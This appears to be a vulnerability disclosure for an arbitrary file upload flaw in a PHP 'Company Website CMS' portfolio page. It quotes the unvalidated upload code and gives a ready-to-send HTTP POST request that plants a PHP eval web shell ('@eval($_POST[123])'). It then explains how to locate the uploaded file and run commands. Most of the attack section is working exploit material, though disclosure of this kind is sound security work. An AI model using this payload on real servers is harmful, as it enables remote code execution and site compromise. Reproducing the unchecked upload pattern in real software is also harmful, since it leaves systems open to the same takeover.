# Company Website CMS

Company Website CMS creates /dashboard/Portfolio pages with unlimited back-end code, resulting in arbitrary file upload vulnerabilities.

The back-end code is:

```php
$uploads_dir = 'uploads/portfolio';

        $tmp_name = $_FILES["ufile"]["tmp_name"];
        // basename() may prevent filesystem traversal attacks;
        // further validation/sanitation of the filename may be appropriate
        $name = basename($_FILES["ufile"]["name"]);
        $random_digit=rand(0000,9999);
        $new_file_name=$random_digit.$name;

        move_uploaded_file($tmp_name, "$uploads_dir/$new_file_name");
```

It can be seen that there is an unlimited file upload, only the file name is concatenated by random values and then moved.

The upload page is:

![image-20250309215745498](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092157549.png)

Upload file:

![image-20250309215920374](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092159410.png)

Use payload as:

```
POST /vogue/dashboard/createportfolio HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Length: 839
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/vogue/dashboard/createportfolio
Cookie: PHPSESSID=8udk6re20tpda96ncs7of8bb94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_title"

file upload text222222222222
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_desc"

uploaduploaduploaduploaduploaduploadupload
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_detail"

uploaduploaduploaduploaduploaduploaduploaduploadupload
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="ufile"; filename="text.php"
Content-Type: application/octet-stream

<?php echo "portfolio"; @eval($_POST[123]); ?>
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="save"


------geckoformboundaryafbda5700eee89a77231823337f34d28--

```

After uploading the file, you can see that the normal icon content in the foreground has been pushed to the side:

![image-20250309220034549](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092200619.png)

But here is a little messy, you can directly look at the source code and search keywords:
![image-20250309182520661](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092200009.png)

Also get the file name, and then access the command can be executed:

![image-20250309182556560](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092200007.png)

————————